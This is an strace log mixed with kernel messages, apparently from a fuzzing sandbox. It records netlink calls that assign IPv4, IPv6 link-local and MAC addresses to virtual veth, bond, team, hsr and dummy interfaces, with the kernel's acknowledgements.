[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x20\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1d\x08\x00\x01\x00\xac\x14\x14\x1d"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_bond", ifr_ifindex=32}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x20\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1d\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1d"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_bond", ifr_ifindex=32}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x20\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1d\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[   77.030891][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_bridge: link becomes ready
[   77.040132][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): bridge_slave_1: link becomes ready
[   77.048997][ T1120] bridge0: port 2(bridge_slave_1) entered blocking state
[   77.056126][ T1120] bridge0: port 2(bridge_slave_1) entered forwarding state
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_bond", ifr_ifindex=34}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x22\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1e\x08\x00\x01\x00\xac\x14\x14\x1e"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_bond", ifr_ifindex=34}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x22\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1e\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1e"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_bond", ifr_ifindex=34}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x22\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1e\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_team", ifr_ifindex=36}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x24\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1f\x08\x00\x01\x00\xac\x14\x14\x1f"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_team", ifr_ifindex=36}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x24\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_team", ifr_ifindex=36}) = 0
[pid  5086] close(4)                    = 0
[   77.081033][   T26] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_bond: link becomes ready
[   77.107118][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_bond: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x24\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1f\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_team", ifr_ifindex=38}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x26\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x20\x08\x00\x01\x00\xac\x14\x14\x20"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_team", ifr_ifindex=38}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x26\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_team", ifr_ifindex=38}) = 0
[pid  5086] close(4)                    = 0
[   77.136595][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_team: link becomes ready
[   77.147713][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): team_slave_0: link becomes ready
[   77.159435][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): team0: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x26\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x20\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_hsr", ifr_ifindex=45}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x2d\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x21\x08\x00\x01\x00\xac\x14\x14\x21"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_hsr", ifr_ifindex=45}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x2d\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x21\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x21"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_hsr", ifr_ifindex=45}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x2d\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x21\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_hsr", ifr_ifindex=47}) = 0
[pid  5086] close(4)                    = 0
[   77.183860][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_team: link becomes ready
[   77.198246][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): team_slave_1: link becomes ready
[   77.222274][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_hsr: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x2f\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x22\x08\x00\x01\x00\xac\x14\x14\x22"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_hsr", ifr_ifindex=47}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x2f\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x22\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x22"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_hsr", ifr_ifindex=47}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x2f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x22\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="hsr0", ifr_ifindex=49}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x31\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x23\x08\x00\x01\x00\xac\x14\x14\x23"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="hsr0", ifr_ifindex=49}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x31\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x23\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x23"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="hsr0", ifr_ifindex=49}) = 0
[pid  5086] close(4)                    = 0
[   77.235455][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): hsr_slave_0: link becomes ready
[   77.257830][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_hsr: link becomes ready
[   77.266304][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): hsr_slave_1: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x31\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="dummy0", ifr_ifindex=17}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x11\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x24\x08\x00\x01\x00\xac\x14\x14\x24"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="dummy0", ifr_ifindex=17}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x11\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="dummy0", ifr_ifindex=17}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x24\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="nlmon0", ifr_ifindex=18}) = 0
[pid  5086] close(4)                    = 0
